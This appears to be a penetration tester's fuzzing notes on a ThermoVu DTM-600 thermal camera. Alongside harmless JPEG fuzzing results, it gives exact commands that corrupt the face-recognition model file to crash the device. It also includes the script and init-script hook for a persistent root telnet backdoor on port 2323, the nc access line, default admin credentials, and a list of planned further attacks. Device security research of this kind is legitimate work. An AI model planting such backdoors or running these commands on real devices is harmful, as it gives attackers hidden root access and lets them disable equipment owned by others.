# DTM-600 Fuzzing Results

## Session Summary
- Target: Digital Ally ThermoVu DTM-600 (192.168.30.178)
- Root shell access via persistent backdoor on port 2323
- Focus: Face recognition pipeline, image processing, neural network

---

## Vulnerability Found

### 1. NNIE Model File Crash (DoS) - CONFIRMED
- **File:** `/program/factory/BestFace.bin`
- **Attack:** Replace with truncated model file (e.g., `CNN\x00` + 100 null bytes)
- **Result:** Complete system crash, device unresponsive
- **Impact:** Denial of Service requiring physical reboot
- **Severity:** HIGH (if attacker has file write access)
- **Prerequisites:** Write access to `/program` partition (requires remount as rw)

**Reproduction:**
```bash
mount -o remount,rw /program
echo -ne 'CNN\x00' > /program/factory/BestFace.bin
dd if=/dev/zero bs=1 count=100 >> /program/factory/BestFace.bin
mount -o remount,ro /program
# Reboot or restart mwareserver - system crashes
```

---

## Tested Attack Vectors (No Crash)

### 2. JPEG Library Fuzzing - ROBUST
Tested against `libjpeg.so.7` via mmi_client image loading:

| Test Case | Result |
|-----------|--------|
| Dimensions 0x0 | Graceful failure |
| Dimensions 65535x65535 | Graceful failure |
| Integer overflow dims (46341x46341) | Graceful failure |
| EXIF injection (256 bytes) | Graceful failure |
| Bad marker length (0, 1, 65535) | Graceful failure |
| Comment injection with commands | Graceful failure |
| Heap spray via DQT tables | Graceful failure |
| Huffman table overflow | Graceful failure |
| Nested APP markers (1000x) | Graceful failure |
| Truncated JPEG | Graceful failure |

**Conclusion:** libjpeg implementation is well-hardened with proper error handling.

### 3. WorkLogo Image Replacement
- **Path:** `/data/GUIFile/WorkLogo.jpg`
- **Result:** `LoadBitmap[/data/GUIFile/WorkLogo.jpg] Fail[4294967295]` (error -1)
- **Impact:** None - graceful failure

### 4. Screensaver Image Replacement
- **Path:** `/program/mmi_source/ScreenSaver_en/screenSave1.jpg`
- **Result:** No immediate crash (screensaver not actively displayed)

---

## Attack Surface Analysis

### Image Processing Entry Points

1. **mmi_client** (PID varies)
   - Uses libjpeg.so.7
   - Loads images from `/data/GUIFile/`, `/program/mmi_source/`
   - Well-hardened error handling

2. **mwareserver** (PID varies)
   - Main application (6.6MB binary)
   - 144+ threads
   - Handles face detection via NNIE
   - Loads BestFace.bin model

3. **LAPI REST API**
   - Most endpoints return "Not Supported" on this device
   - `/LAPI/V1.0/PeopleLibraries` - Not Supported
   - `/LAPI/V1.0/FaceCompare/Libraries` - Not Supported
   - Basic auth: admin:Password1

### Neural Network / Face Detection

- **NNIE Device:** `/dev/nnie` (HiSilicon Neural Network Inference Engine)
- **Face Model:** `/program/factory/BestFace.bin` (166KB, CNN format)
- **Detection:** YOLO-based face detection (`TE_faceDetYOLO_` allocations)
- **Config:**
  - `FaceEnable=1` (detection enabled)
  - `CompareEn=0` (comparison disabled)
  - `AttrEn=0` (attributes disabled)
  - `IDFaceThreshold=60`

### File System Layout

| Partition | Mount | Type | Notes |
|-----------|-------|------|-------|
| mmcblk2p5 | /config | ext4 rw | Persistent config, backdoor.sh |
| mmcblk2p12 | /program | ext4 ro | Binaries, models, www |
| mmcblk2p14 | /data | ext4 rw | User data, WorkLibFile |
| rootfs | / | rootfs | RAM-based, non-persistent |

---

## Persistent Backdoor

Successfully installed persistent root shell:

1. **Script:** `/config/backdoor.sh`
   ```bash
   #!/bin/sh
   while true; do
       busybox telnetd -p 2323 -l /bin/sh
       sleep 5
   done
   ```

2. **Hook:** `/program/bin/mware_init.sh` (line 2-3)
   ```bash
   # Backdoor: start root telnet on 2323
   [ -x /config/backdoor.sh ] && /config/backdoor.sh &
   ```

3. **Access:** `nc 192.168.30.178 2323`

---

## Further Research Directions

1. **NNIE Model Fuzzing**
   - More sophisticated model corruption (specific layer tampering)
   - Test memory corruption during model loading
   - Explore code execution via crafted model

2. **Face Template Database**
   - `/data/WorkLibFile/` structure analysis
   - Template injection attacks
   - Feature vector manipulation

3. **IPC Fuzzing**
   - Message queues: 0x5678, 0x8765, 0x6789
   - UDP ports: 2048, 7001 (localhost)
   - BP_SendSyncGetMsg / BP_SendAsyncMsg interfaces

4. **Video Pipeline Injection**
   - `/dev/hi_mipi` - MIPI camera interface
   - Frame buffer manipulation
   - RTSP stream injection

5. **Second-Order Attacks**
   - See: `SCRIPTS/second-order-attacks.py`
   - Config injection
   - Template poisoning
   - Library preload

---

## Files Created

- `FUZZ_CORPUS/` - 58 malformed JPEG test cases
- `SCRIPTS/runtime-image-fuzzer.py` - JPEG fuzzer with LAPI upload
- `SCRIPTS/second-order-attacks.py` - Second-order attack framework
- `NOTES/fuzzing-results.md` - This document
